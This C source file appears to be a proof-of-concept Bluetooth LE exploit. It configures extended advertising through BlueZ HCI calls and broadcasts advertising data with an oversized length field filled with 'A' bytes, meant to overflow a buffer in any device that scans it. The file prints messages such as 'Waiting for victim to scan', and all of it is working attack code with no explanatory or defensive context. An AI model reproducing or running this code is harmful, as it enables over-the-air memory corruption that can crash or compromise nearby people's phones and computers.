#include <stdlib.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/uio.h>
#include <bluetooth/bluetooth.h>
#include <bluetooth/l2cap.h>
#include <bluetooth/hci.h>
#include <bluetooth/hci_lib.h>

#define OCF_LE_SET_EXTENDED_ADVERTISING_PARAMETERS	0x2036
typedef struct {
	uint8_t  handle;
	uint16_t evt_properties;
	uint8_t  min_interval[3];
	uint8_t  max_interval[3];
	uint8_t  channel_map;
	uint8_t  own_addr_type;
	uint8_t  peer_addr_type;
	uint8_t  peer_addr[6];
	uint8_t  filter_policy;
	uint8_t  tx_power;
	uint8_t  primary_phy;
	uint8_t  secondary_max_skip;
	uint8_t  secondary_phy;
	uint8_t  sid;
	uint8_t  notif_enable;
} __attribute__ ((packed)) le_set_extended_advertising_parameters_cp;
#define LE_SET_EXTENDED_ADVERTISING_PARAMETERS_CP_SIZE 25

#define OCF_LE_SET_EXTENDED_ADVERTISING_DATA		0x2037
typedef struct {
	uint8_t  handle;
	uint8_t  operation;
	uint8_t  fragment_preference;
	uint8_t  data_len;
	uint8_t  data[0];
} __attribute__ ((packed)) le_set_extended_advertising_data_cp;
#define LE_SET_EXTENDED_ADVERTISING_DATA_CP_SIZE 4

#define OCF_LE_SET_EXTENDED_SCAN_RESPONSE_DATA	0x2038
typedef struct {
	uint8_t  handle;
	uint8_t  operation;
	uint8_t  fragment_preference;
	uint8_t  data_len;
	uint8_t  data[0];
} __attribute__ ((packed)) le_set_extended_scan_response_data_cp;
#define LE_SET_EXTENDED_SCAN_RESPONSE_DATA_CP_SIZE 4

#define OCF_LE_SET_EXTENDED_ADVERTISE_ENABLE		0x2039
typedef struct {
	uint8_t  enable;
	uint8_t  num_of_sets;
} __attribute__ ((packed)) le_set_extended_advertise_enable_cp;
#define LE_SET_EXTENDED_ADVERTISE_ENABLE_CP_SIZE 2

typedef struct {
	uint8_t  handle;
	uint16_t duration;
	uint8_t  max_events;
} __attribute__ ((packed)) le_extended_advertising_set;
#define LE_SET_EXTENDED_ADVERTISING_SET_SIZE 4

#define OVERFLOW_SIZE 0xe5

int main(int argc, char **argv) {
  struct hci_request rq;
  uint8_t status;
  char buf[0x100];

  printf("[*] Resetting hci0 device...\n");
  system("sudo hciconfig hci0 down");
  system("sudo hciconfig hci0 up");

  printf("[*] Opening hci device...\n");
  struct hci_dev_info di;
  int hci_device_id = hci_get_route(NULL);
  int hci_socket = hci_open_dev(hci_device_id);
  if (hci_devinfo(hci_device_id, &di) < 0) {
    perror("hci_devinfo");
    return 1;
  }

  le_set_extended_advertising_parameters_cp params;
  memset(&params, 0, LE_SET_EXTENDED_ADVERTISING_PARAMETERS_CP_SIZE);
  params.handle = 0;
  params.evt_properties = 1;
  params.min_interval[1] = 0x8;
  params.max_interval[1] = 0x8;
  params.channel_map = 7;
  params.tx_power = 0x7f;
  params.primary_phy = 1;
  params.secondary_phy = 1;

  memset(&rq, 0, sizeof(rq));
  rq.ogf = OGF_LE_CTL;
  rq.ocf = OCF_LE_SET_EXTENDED_ADVERTISING_PARAMETERS;
  rq.cparam = &params;
  rq.clen = LE_SET_EXTENDED_ADVERTISING_PARAMETERS_CP_SIZE;
  rq.rparam = &status;
  rq.rlen = sizeof(status);

  printf("[*] Setting extended advertising parameters...\n");
  hci_send_req(hci_socket, &rq, 1000);

  le_set_extended_advertising_data_cp *adv_data = (le_set_extended_advertising_data_cp *)buf;
  adv_data->handle = 0;
  adv_data->operation = 3;
  adv_data->fragment_preference = 1;
  adv_data->data_len = OVERFLOW_SIZE;
  adv_data->data[0] = OVERFLOW_SIZE - 1;
  memset(&adv_data->data[1], 'A', OVERFLOW_SIZE - 1);

  memset(&rq, 0, sizeof(rq));
  rq.ogf = OGF_LE_CTL;
  rq.ocf = OCF_LE_SET_EXTENDED_ADVERTISING_DATA;
  rq.cparam = adv_data;
  rq.clen = LE_SET_EXTENDED_ADVERTISING_DATA_CP_SIZE + OVERFLOW_SIZE;
  rq.rparam = &status;
  rq.rlen = sizeof(status);

  printf("[*] Setting extended advertising data...\n");
  hci_send_req(hci_socket, &rq, 1000);

  le_set_extended_advertise_enable_cp *enable = (le_set_extended_advertise_enable_cp *)buf;
  le_extended_advertising_set *set = (le_extended_advertising_set *)(buf + 2);
  enable->enable = 1;
  enable->num_of_sets = 1;
  set->handle = 0;
  set->duration = 0;
  set->max_events = 0;

  memset(&rq, 0, sizeof(rq));
  rq.ogf = OGF_LE_CTL;
  rq.ocf = OCF_LE_SET_EXTENDED_ADVERTISE_ENABLE;
  rq.cparam = buf;
  rq.clen = LE_SET_EXTENDED_ADVERTISE_ENABLE_CP_SIZE + LE_SET_EXTENDED_ADVERTISING_SET_SIZE;
  rq.rparam = &status;
  rq.rlen = sizeof(status);

  printf("[*] Enabling extended advertising...\n");
  hci_send_req(hci_socket, &rq, 1000);

  printf("[*] Waiting for victim to scan...\n");
  sleep(60);

  hci_close_dev(hci_socket);

  return 0;
}
